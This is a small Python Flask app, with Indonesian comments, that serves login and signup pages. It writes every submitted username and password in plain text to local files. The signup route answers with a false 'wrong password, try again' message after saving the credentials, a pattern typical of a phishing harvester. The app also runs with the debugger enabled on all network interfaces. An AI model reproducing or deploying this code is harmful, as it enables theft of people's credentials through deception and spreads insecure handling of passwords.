import os
from flask import Flask, render_template, request


app = Flask(__name__)

# Pastikan file login dan signup tersedia
if not os.path.exists("login.txt"):
    open("login.txt", "w").close()

if not os.path.exists("signup.txt"):
    open("signup.txt", "w").close()
os.getenv("cyber", "localhost")
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')

        # Simpan data login ke file login.txt
        with open('login.txt', 'a') as f:
            f.write(f"LOGIN: Username: {username}, Password: {password}\n")

        return "Login data has been saved successfully!"

    return render_template('login.html')

@app.route('/signup', methods=['GET', 'POST'])
def signup():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')

        # Simpan data signup ke file signup.txt
        with open('signup.txt', 'a') as f:
            f.write(f"SIGNUP: Username: {username}, Password: {password}\n")

        return "password salah coba lagi!"

    return render_template('login.html')  # Gunakan file HTML yang sama untuk login dan sign-up

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=8080, debug=True)
